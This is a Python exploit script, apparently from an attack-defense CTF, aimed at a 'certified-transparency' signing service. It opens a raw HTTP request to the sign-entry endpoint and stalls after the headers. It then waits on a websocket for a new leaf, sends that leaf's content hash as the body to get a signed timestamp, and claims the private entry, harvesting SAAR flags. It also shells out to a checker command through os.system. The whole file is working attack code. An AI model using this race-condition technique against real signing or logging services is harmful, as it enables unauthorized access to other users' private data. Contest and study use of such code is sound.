import json
import os
import sys
import threading
from base64 import b64decode

import websocket
from dataclasses import dataclass, field

os.environ['PWNLIB_NOTERM'] = '1'
from pwn import remote

try:
    from .api import Api, Sth, TreeLeafProof, TreeLeaf, json_encode
except ImportError:
    from api import Api, Sth, TreeLeafProof, TreeLeaf, json_encode


def await_next_new_leaf(target: str) -> tuple[int, bytes]:
    # for CI/local testing:
    threading.Thread(target=lambda: wait_for_checker_to_store_flags(target), daemon=True).start()

    ws = websocket.create_connection(f"ws://{target}:3001/api/v1/watch")
    try:
        while True:
            message = ws.recv()
            print(repr(message))
            if isinstance(message, str):
                parsed = json.loads(message)
                index, leaf = parsed['index'], b64decode(parsed['leaf'])
                if len(TreeLeaf.from_binary(leaf).data_for_private_claims) > 28:
                    return index, leaf
    finally:
        ws.close()


def wait_for_checker_to_store_flags(target: str) -> None:
    """
    In our CI environment, the environment variable "CHECKER_STORE_CMD" triggers the checker to store flags.
    """
    print('-' * 80)
    print('running checker ...')
    sys.stdout.flush()
    if 'CHECKER_STORE_CMD' in os.environ:
        os.system(os.environ['CHECKER_STORE_CMD'] + " 2>&1 | tac | tac | sed 's/SAAR{/SAAR_/'")
    else:
        # Trigger the regular checker script with some parameters (adjust for your own testing)
        os.system(f"PYTHONPATH=../ python3 -u ../checkers/certified-transparency.py '{target}' store")
    print('-' * 80)


@dataclass
class HttpResponse:
    code: int
    headers: dict = field(default_factory=dict)
    body: bytes = b''

    @classmethod
    def from_response(cls, body: bytes) -> 'HttpResponse':
        idx = body.index(b'\r\n')
        response = HttpResponse(int(body[:idx].split(b' ')[1].decode()))
        body = body[idx + 2:]
        while True:
            try:
                idx = body.index(b'\r\n')
                if idx == 0:
                    body = body[2:]
                    break
                k, v = body[:idx].split(b': ', 1)
                response.headers[k.decode()] = v.decode()
                body = body[idx + 2:]
            except ValueError:
                break
        response.body = body
        return response


@dataclass
class HttpRequest:
    def __init__(self, host: str, port: int, method: str, url: str, body: bytes) -> None:
        self.host = host
        self.port = port
        self.method = method
        self.url = url
        self.body = body
        self.headers = {
            'Host': host,
            'Content-Type': 'application/json',
            'Content-Length': str(len(self.body)),
            'Connection': 'close'
        }
        self._conn = None

    def open(self) -> None:
        self._conn = remote(self.host, self.port)

    def close(self) -> None:
        if self._conn is not None:
            self._conn.close()
            self._conn = None

    def send_headers(self) -> None:
        self._conn.send(f'POST {self.url} HTTP/1.0\r\n'.encode())
        for k, v in self.headers.items():
            self._conn.send(f'{k}: {v}\r\n'.encode())
        self._conn.send(b'\r\n')

    def send_body(self) -> None:
        self._conn.send(self.body)

    def read_response(self) -> HttpResponse:
        return HttpResponse.from_response(self._conn.recvall(timeout=3))


def exploit(target: str):
    api = Api(target)

    for _ in range(2):
        # body needed for length only, not yet sent
        body = {
            'content_hash': b'\x00' * 32,
            'name': 'pwn'
        }
        request = HttpRequest(target, 3000, 'POST', '/api/v1/sign-entry', json_encode(body))
        # open connection, send headers, then stall
        request.open()
        request.send_headers()  # server will take this timestamp

        index, leaf = await_next_new_leaf(target)

        # create a sign request with the hash we just saw
        body['content_hash'] = TreeLeaf.from_binary(leaf).contenthash
        request.body = json_encode(body)
        request.send_body()
        response = request.read_response()
        print(response)
        sot = b64decode(json.loads(response.body.decode())['sot'])
        request.close()

        print(api.claim_private(sot, api.get_entry_proof(index)))


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost')
